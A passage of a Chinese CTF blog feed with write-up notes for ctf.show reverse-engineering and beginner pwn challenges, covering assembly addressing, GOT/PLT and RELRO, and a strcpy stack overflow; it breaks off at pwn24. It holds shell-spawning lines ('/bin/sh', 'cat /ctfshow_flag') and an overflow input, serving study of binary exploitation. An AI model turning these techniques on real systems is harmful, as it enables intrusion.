class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0x61</span>,<span class="number">0x61</span>+<span class="number">26</span>))</span><br><span class="line">    R=[]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">                r=decript(L,n,[a,b,c],<span class="number">3</span>)</span><br><span class="line">                <span class="comment">#print(a,b,c,r)</span></span><br><span class="line">                <span class="keyword">if</span> r:</span><br><span class="line">                    s=<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)</span><br><span class="line">                    <span class="built_in">print</span>(s,<span class="string">&#x27;is ok!!!&#x27;</span>)</span><br><span class="line">                    R.append(s)</span><br><span class="line">    <span class="built_in">print</span>(R)</span><br><span class="line">               </span><br><span class="line"></span><br><span class="line">brute(<span class="string">&#x27;ctfshow01.exe&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è¿›åˆ¶"><a href="#è¿›åˆ¶" class="headerlink" title="è¿›åˆ¶"></a>è¿›åˆ¶</h3><p>æˆ‘ä»¥ä¸ºæ˜¯éé¢„æœŸçš„é¢„æœŸï¼š</p><p>43544653686f777b5468616e6b5f43544653484f575f536b797d</p><p>43 54 46 53 68 6f 77 7b 54 68 61 6e 6b 5f 43 54 46 53 48 4f 57 5f 53 6b 79 7d</p><p>CTFShow{Thank_CTFSHOW_Sky}</p><p>ï¼ˆä¸è¿‡æˆ‘éƒ½çœ‹åˆ°è¿™ä¸ªäº†ï¼Œè¿˜æ²¡è”æƒ³Cryptoç¬¬äºŒé¢˜é‚£ä¸ªï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">647669776d757e83817372816e707479707c888789757c92788d84838b878d9d</span><br></pre></td></tr></table></figure><h3 id="E"><a href="#E" class="headerlink" title="E"></a>E</h3><p>ä¸æ˜¯ï¼Ÿæˆ‘è¿æ–­ç‚¹éƒ½æ²¡ä¸‹ï¼Œç›´æ¥å‡ºflagï¼Ÿ</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240709150257703.png" alt="image-20240709150257703"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è¥¿ç“œæ¯&quot;&gt;&lt;a href=&quot;#è¥¿ç“œæ¯&quot; class=&quot;headerlink&quot; title=&quot;è¥¿ç“œæ¯&quot;&gt;&lt;/a&gt;è¥¿ç“œæ¯&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://ctf.show/challenges#%E8%A5%BF%E7%93%9C%E6%9D%AF%E</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>pwn30--52</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/06/03/ppwn/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/06/03/ppwn/</id>
    <published>2024-06-02T16:00:00.000Z</published>
    <updated>2024-09-16T08:03:41.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-study"><a href="#PWN-study" class="headerlink" title="PWN-study"></a>PWN-study</h1><h3 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h3><p>ç”¨æˆ·åä¸º ctfshow å¯†ç  ä¸º 123456  # æ³¨æ„å¯†ç ä¸æ˜¯ctfshow</p><p>è¯·ä½¿ç”¨ sshè½¯ä»¶è¿æ¥ <code>ssh ctfshow@é¢˜ç›®åœ°å€ -pé¢˜ç›®ç«¯å£å·</code></p><h3 id="pwn1-4"><a href="#pwn1-4" class="headerlink" title="pwn1-4"></a>pwn1-4</h3><ul><li>system(cat &#x2F;ctfshow_flag)</li><li>pwdâ€“lsâ€“cat</li><li>åç¼–è¯‘çœ‹ç»“æœï¼ˆå®é™…ä¸ç”¨ï¼ˆ</li><li>æœ‰ç‚¹é€†å‘å‘³é“ï¼Œæ‰¾åˆ°æ¯”è¾ƒå­—ç¬¦ä¸²ï¼Œæ˜æ–‡å­˜å‚¨ã€‚ä½†æ˜¯è®°å¾—ï¼Œæ²¡æœ‰å›æ˜¾&#x2F;ã€‚ã€‚</li></ul><h2 id="æ±‡ç¼–åŸºç¡€"><a href="#æ±‡ç¼–åŸºç¡€" class="headerlink" title="æ±‡ç¼–åŸºç¡€"></a>æ±‡ç¼–åŸºç¡€</h2><h3 id="pwn5-12"><a href="#pwn5-12" class="headerlink" title="pwn5-12"></a>pwn5-12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; ç«‹å³å¯»å€æ–¹å¼</span><br><span class="line">    mov eax, 11         ; å°†11èµ‹å€¼ç»™eax</span><br><span class="line">    add eax, 114504     ; eaxåŠ ä¸Š114504</span><br><span class="line">    sub eax, 1          ; eaxå‡å»1</span><br><span class="line">// eax = 114514</span><br><span class="line">; å¯„å­˜å™¨å¯»å€æ–¹å¼</span><br><span class="line">    mov ebx, 0x36d      ; å°†0x36dèµ‹å€¼ç»™ebx</span><br><span class="line">    mov edx, ebx        ; å°†ebxçš„å€¼èµ‹å€¼ç»™edx</span><br><span class="line">//edx=0x36D</span><br><span class="line">; ç›´æ¥å¯»å€æ–¹å¼</span><br><span class="line">    mov ecx, msg      ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span><br><span class="line">//ecx=0x80490E8</span><br><span class="line">; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼</span><br><span class="line">    mov esi, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi</span><br><span class="line">    mov eax, [esi]      ; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span><br><span class="line">//eax=0x636C6557</span><br><span class="line">; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼</span><br><span class="line">    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span><br><span class="line">    add ecx, 4          ; å°†ecxåŠ ä¸Š4</span><br><span class="line">    mov eax, [ecx]      ; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; åŸºå€å˜å€å¯»å€æ–¹å¼</span><br><span class="line">    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span><br><span class="line">    mov edx, 2          ; å°†2èµ‹å€¼ç»™edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼</span><br><span class="line">    mov ecx, msg        ; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span><br><span class="line">    mov edx, 1          ; å°†1èµ‹å€¼ç»™edx</span><br><span class="line">    add ecx, 8          ; å°†ecxåŠ ä¸Š8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; è¾“å‡ºå­—ç¬¦ä¸²</span><br><span class="line">    mov eax, 4          ; ç³»ç»Ÿè°ƒç”¨å·4ä»£è¡¨è¾“å‡ºå­—ç¬¦ä¸²</span><br><span class="line">    mov ebx, 1          ; æ–‡ä»¶æè¿°ç¬¦1ä»£è¡¨æ ‡å‡†è¾“å‡º</span><br><span class="line">    mov ecx, msg        ; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€</span><br><span class="line">    mov edx, 22         ; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦</span><br><span class="line">    int 0x80            ; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</span><br><span class="line"></span><br><span class="line">; é€€å‡ºç¨‹åº</span><br><span class="line">    mov eax, 1          ; ç³»ç»Ÿè°ƒç”¨å·1ä»£è¡¨é€€å‡ºç¨‹åº</span><br><span class="line">    xor ebx, ebx        ; è¿”å›å€¼ä¸º0</span><br><span class="line">    int 0x80            ; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>**pwn9:**é‚£ä¹ˆ080490E8åœ°å€å•å…ƒä¸­çš„å€¼å°±ä¸ºï¼š636C6557hï¼Œåé¢çš„hè¡¨ç¤ºç»™æ•°å€¼æ˜¯16è¿›åˆ¶ã€‚æ‰€ä»¥æœ¬æ¡ä»£ç æ‰§è¡Œåeaxå¯„å­˜å™¨ä¸­çš„å€¼å°±ä¸º636C6557hã€‚ æ‰€ä»¥æœ¬é¢˜çš„flagä¸ºï¼šctfshow{0x636C6557} </p><p>ä½¿ç”¨ nasm å‘½ä»¤å¯¹è¯¥æ±‡ç¼–æ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼ŒæŒ‡å®šè¾“å‡ºæ ¼å¼ä¸º ELF æ ¼å¼ï¼Œè¿™ç§æ ¼å¼æ˜¯ä¸€ç§åœ¨ UNIX ç³»ç»Ÿä¸­å¹¿æ³›ä½¿ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ï¼Œå®ƒåŒ…å«äº†ç¨‹åºçš„äºŒè¿›åˆ¶ä»£ç ã€æ•°æ®ã€ç¬¦å·è¡¨ç­‰ä¿¡æ¯ã€‚ <strong>nasm -f elf Welcome_to_CTFshow.asm</strong> å°†è¯¥æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶ <strong>ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o</strong> ld: è¿™æ˜¯ GNU é“¾æ¥å™¨çš„å‘½ä»¤ã€‚</p><p>-m elf_i386: è¿™ä¸ªé€‰é¡¹æŒ‡å®šé“¾æ¥å™¨å·¥ä½œåœ¨ i386 æ¶æ„ä¸‹ï¼Œç”Ÿæˆé’ˆå¯¹ ELF æ ¼å¼çš„ç›®æ ‡æ–‡ä»¶ã€‚i386 æ˜¯ Intel çš„ 32 ä½æ¶æ„ã€‚</p><p>-s: è¿™ä¸ªé€‰é¡¹å‘Šè¯‰é“¾æ¥å™¨åœ¨ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­å»é™¤ç¬¦å·è¡¨å’Œè°ƒè¯•ä¿¡æ¯ï¼Œä»¥å‡å°æ–‡ä»¶å¤§å°ã€‚</p><p>-o Welcome_to_CTFshow: è¿™ä¸ªé€‰é¡¹æŒ‡å®šç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶åä¸º Welcome_to_CTFshowã€‚</p><p>Welcome_to_CTFshow.o: è¿™æ˜¯è¦é“¾æ¥çš„è¾“å…¥æ–‡ä»¶ï¼Œæ˜¯ç”±æ±‡ç¼–å™¨ç”Ÿæˆçš„å¯¹è±¡æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†æ±‡ç¼–ä»£ç çš„å·²ç¼–è¯‘äºŒè¿›åˆ¶è¡¨ç¤ºã€‚ checksec Welcome_to_CTFshow é€‰ä¸­ä½¿ç”¨å¿«æ·é”® A å°†æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p><h2 id="äºŒè¿›åˆ¶æ–‡ä»¶åŸºç¡€"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶åŸºç¡€" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶åŸºç¡€"></a>äºŒè¿›åˆ¶æ–‡ä»¶åŸºç¡€</h2><h3 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h3><p>gcc -o flag flag.câ€”â€”â€”-ctfshow{hOw_t0_us3_GCC?}</p><h3 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h3><p>&#x2F;&#x2F;&#x2F;é“¾æ¥æ–‡ä»¶</p><p>echo CTFshow &gt; key # åˆ›å»ºå†…å®¹ä¸ºCTFshowçš„keyæ–‡ä»¶ gcc -o flag .&#x2F;flag.c # ç¼–è¯‘flag.c .&#x2F;flag #è¿è¡Œflagæ–‡ä»¶é‚£flag</p><h3 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 flag.asm # å°†flag.asmç¼–è¯‘æˆ64ä¸º.oæ–‡ä»¶</span><br><span class="line">ld -s -o flag flag.o # å°†flag.oé“¾æ¥æˆflagå¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">./flag # è¿è¡Œflagå¯æ‰§è¡Œæ–‡ä»¶æ‹¿åˆ°flag</span><br></pre></td></tr></table></figure><h3 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o flag flag.s # å°†flag.sç¼–è¯‘æˆflagå¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">./flag # è¿è¡Œflagå¯æ‰§è¡Œæ–‡ä»¶æ‹¿åˆ°flag</span><br></pre></td></tr></table></figure><h3 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h3><p>é™åˆ¶äº†æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º9,system(â€œ&#x2F;bin&#x2F;shâ€);æ˜¯å¯ä»¥è·å¾—Linuxçš„äº¤äº’å¼shellçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">cat /ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="Linuxç›¸å…³åŸºç¡€å‘½ä»¤"><a href="#Linuxç›¸å…³åŸºç¡€å‘½ä»¤" class="headerlink" title="Linuxç›¸å…³åŸºç¡€å‘½ä»¤"></a>Linuxç›¸å…³åŸºç¡€å‘½ä»¤</h2><h3 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h3><p>echo &gt;&gt; ä¸¤ä¸ª&gt;è¡¨ç¤ºè¿½åŠ </p><p>echo &gt; ä¸€ä¸ª&gt;è¡¨ç¤ºè¦†ç›–</p><h3 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h3><p>å…³é—­äº†è¾“å‡ºæµ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// attributes: thunk</span><br><span class="line">__pid_t fork(void)</span><br><span class="line">&#123;</span><br><span class="line">  return fork();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ &gt;&amp;0å®šå‘åˆ°è¾“å…¥æµ</p><p>è¾“å…¥å‘½ä»¤â€™pwd &gt;&amp;0â€™ä¹‹åï¼Œç»™æˆ‘ä»¬è¿”å›äº†&#x2F;ï¼Œä»£è¡¨æˆ‘ä»¬æ‰€å¤„æ ¹è·¯å¾„ã€‚</p><p>å†é‡æ–°ncè¿æ¥(å› ä¸ºè¿™ä¸ªç¨‹åºç»™æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„ç¯å¢ƒä¸æ˜¯äº¤äº’å¼çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†æ¬¡ncè¿æ¥æ‰§è¡Œå‘½ä»¤)ï¼Œä½¿ç”¨ls &gt;&amp;0æŸ¥çœ‹æ ¹ç›®å½•ã€‚</p><p>å†ä½¿ç”¨cat ctfshow_flag &gt;&amp;0</p><h2 id="Linuxå®‰å…¨æœºåˆ¶"><a href="#Linuxå®‰å…¨æœºåˆ¶" class="headerlink" title="Linuxå®‰å…¨æœºåˆ¶"></a>Linuxå®‰å…¨æœºåˆ¶</h2><h3 id="got-plt"><a href="#got-plt" class="headerlink" title=".got  .plt"></a>.got  .plt</h3><p>ã€‹<a href="http://t.csdnimg.cn/NfKt8">http://t.csdnimg.cn/NfKt8</a></p><p><strong>è¿è¡Œæ—¶é‡å®šä½</strong></p><p><strong>è¿™ä¸ªåœ°å€åœ¨é“¾æ¥æ—¶è¦ä¿®æ­£ï¼Œå®ƒçš„ä¿®æ­£å€¼æ˜¯æ ¹æ®printfåœ°å€ï¼ˆæ›´ç¡®åˆ‡çš„å«æ³•åº”è¯¥æ˜¯ç¬¦å·ï¼Œé“¾æ¥å™¨çœ¼ä¸­åªæœ‰ç¬¦å·ï¼Œæ²¡æœ‰æ‰€è°“çš„å‡½æ•°å’Œå˜é‡ï¼‰æ¥ä¿®æ­£ï¼Œå®ƒçš„ä¿®æ­£æ–¹å¼æŒ‰ç›¸å¯¹å¼•ç”¨æ–¹å¼</strong>ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<strong>é“¾æ¥æ—¶é‡å®šä½</strong></p><p>printfæ˜¯åœ¨glibcåŠ¨æ€åº“å®šä½ï¼Œæˆ–è€…æ˜¯åœ¨å…¶å®ƒ.oå®šä¹‰è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå®ƒéƒ½èƒ½å·¥ä½œã€‚å¦‚æœæ˜¯åœ¨å…¶å®ƒ.oä¸­å®šä¹‰äº†printfå‡½æ•°ï¼Œé‚£åœ¨é“¾æ¥é˜¶æ®µï¼Œprintfåœ°å€å·²ç»ç¡®å®šï¼Œå¯ä»¥ç›´æ¥é‡å®šä½ã€‚å¦‚æœprintfå®šä¹‰åœ¨åŠ¨æ€åº“å†…ï¼ˆé“¾æ¥é˜¶æ®µæ˜¯å¯ä»¥çŸ¥é“printfåœ¨å“ªå®šä¹‰çš„ï¼Œåªæ˜¯å¦‚æœå®šä¹‰åœ¨åŠ¨æ€åº“å†…ä¸çŸ¥é“å®ƒçš„åœ°å€è€Œå·²ï¼‰ï¼Œé“¾æ¥é˜¶æ®µæ— æ³•åšé‡å®šä½ã€‚</p><p>å­˜æ”¾å‡½æ•°åœ°å€çš„æ•°æ®è¡¨ï¼Œç§°ä¸º<strong>é‡å±€åç§»è¡¨</strong>ï¼ˆGOT, Global Offset Tableï¼‰ï¼Œè€Œé‚£ä¸ªé¢å¤–ä»£ç æ®µè¡¨ï¼Œç§°ä¸º<strong>ç¨‹åºé“¾æ¥è¡¨</strong>ï¼ˆPLTï¼ŒProcedure Link Tableï¼‰ã€‚<strong>å®ƒä»¬ä¸¤å§å¦¹å„å¸å…¶èŒï¼Œè”åˆå‡ºæ‰‹ä¸Šæ¼”è¿™ä¸€å‡ºè¿è¡Œæ—¶é‡å®šä½å¥½æˆ</strong>ã€‚</p><p><img src="https://img-blog.csdn.net/20160611124517413" alt="PLTå’ŒGOTåŸç†é›å½¢"></p><p>å½“ç„¶è¿™ä¸ªåŸç†å›¾å¹¶ä¸æ˜¯Linuxä¸‹çš„PLT&#x2F;GOTçœŸå®è¿‡ç¨‹ï¼ŒLinuxä¸‹çš„PLT&#x2F;GOTè¿˜æœ‰æ›´å¤šç»†èŠ‚è¦è€ƒè™‘äº†ã€‚è¿™ä¸ªå›¾åªæ˜¯å°†è¿™äº›èºå£°å…¨éƒ¨æ¶ˆé™¤ï¼Œè®©å¤§å®¶æ˜ç¡®çœ‹åˆ°PLT&#x2F;GOTæ˜¯å¦‚ä½•ç©¿é’ˆå¼•çº¿çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checksec æ–‡ä»¶</span><br><span class="line">å½“RELROä¸ºPartial RELROæ—¶ï¼Œè¡¨ç¤º.gotä¸å¯å†™è€Œ.got.pltå¯å†™ã€‚</span><br><span class="line">å½“RELROä¸ºFullRELROæ—¶ï¼Œè¡¨ç¤º.gotä¸å¯å†™.got.pltä¹Ÿä¸å¯å†™ã€‚</span><br><span class="line">å½“RELROä¸ºNo RELROæ—¶ï¼Œè¡¨ç¤º.gotä¸.got.pltéƒ½å¯å†™ã€‚</span><br></pre></td></tr></table></figure><h3 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">readelf -S pwn</span><br><span class="line">[Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line"> [21] .got              PROGBITS         0000000000600f18  00000f18</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000600f28  00000f28</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>ctfshow{1_1_0x600f18_0x600f28}</p><h3 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ checksec ppwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ppwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ readelf -S ppwn     </span><br><span class="line">  [21] .got              PROGBITS         0000000000600ff0  00000ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br></pre></td></tr></table></figure><h3 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ checksec pwwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ readelf -S pwwn</span><br><span class="line">x  [12] .plt              PROGBITS         0000000000400450  00000450</span><br><span class="line">       0000000000000040  0000000000000010  AX       0     0     16</span><br><span class="line">  [21] .got              PROGBITS         0000000000600fc0  00000fc0</span><br><span class="line">       0000000000000040  0000000000000008  WA       0     0     8</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ctfshow{0_0_0x600fc0}</p><h3 id="æº¢å‡º"><a href="#æº¢å‡º" class="headerlink" title="æº¢å‡º"></a>æº¢å‡º</h3><h3 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h3><p>ctfshowå‡½æ•°æ˜¯ä¸€ä¸ªå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºçš„<a href="https://so.csdn.net/so/search?q=strcpy%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">strcpyå‡½æ•°</a>ï¼Œæˆ‘ä»¬å°±è¦å°½å¯èƒ½çš„è¾“å…¥æ›´å¤šçš„å­—ç¬¦ä¸²ä»¥è®©ç¨‹åºå‘ç”Ÿæº¢å‡ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ./pwnme aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">    â–„â–„â–„â–„   â–„â–„â–„â–„â–„â–„â–„â–„  â–„â–„â–„â–„â–„â–„â–„â–„            â–„â–„                           </span><br><span class="line">  â–ˆâ–ˆâ–€â–€â–€â–€â–ˆ  â–€â–€â–€â–ˆâ–ˆâ–€â–€â–€  â–ˆâ–ˆâ–€â–€â–€â–€â–€â–€            â–ˆâ–ˆ                           </span><br><span class="line"> â–ˆâ–ˆâ–€          â–ˆâ–ˆ     â–ˆâ–ˆ        â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„  â–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„  â–ˆâ–ˆ      â–ˆâ–ˆ</span><br><span class="line"> â–ˆâ–ˆ           â–ˆâ–ˆ     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–„â–„â–„â–„ â–€  â–ˆâ–ˆâ–€   â–ˆâ–ˆ  â–ˆâ–ˆâ–€  â–€â–ˆâ–ˆ â–€â–ˆ  â–ˆâ–ˆ  â–ˆâ–€</span><br><span class="line"> â–ˆâ–ˆâ–„          â–ˆâ–ˆ     â–ˆâ–ˆ         â–€â–€â–€â–€â–ˆâ–ˆâ–„  â–ˆâ–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆâ–„â–ˆâ–ˆâ–„â–ˆâ–ˆ </span><br><span class="line">  â–ˆâ–ˆâ–„â–„â–„â–„â–ˆ     â–ˆâ–ˆ     â–ˆâ–ˆ        â–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ  â–€â–ˆâ–ˆâ–„â–„â–ˆâ–ˆâ–€  â–€â–ˆâ–ˆ  â–ˆâ–ˆâ–€ </span><br><span class="line">    â–€â–€â–€â–€      â–€â–€     â–€â–€         â–€â–€â–€â–€â–€â–€   â–€â–€    â–€â–€    â–€â–€â–€â–€     â–€â–€  â–€â–€  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- å…¥é—¨                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : No canary found                                         </span><br><span class="line">    * *************************************                           </span><br><span class="line">How to input ?</span><br><span class="line">ctfshow&#123;1c6bbef8-addb-4f20-a6ce-512f3684d46f&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h3><h5 id="é¢˜ç›®æç¤ºä½¿ç”¨pwntoolsçš„shellcraftæ¨¡å—è¿›è¡Œæ”»å‡»ï¼Œå› æ­¤ç›´æ¥ç¼–å†™exp"><a 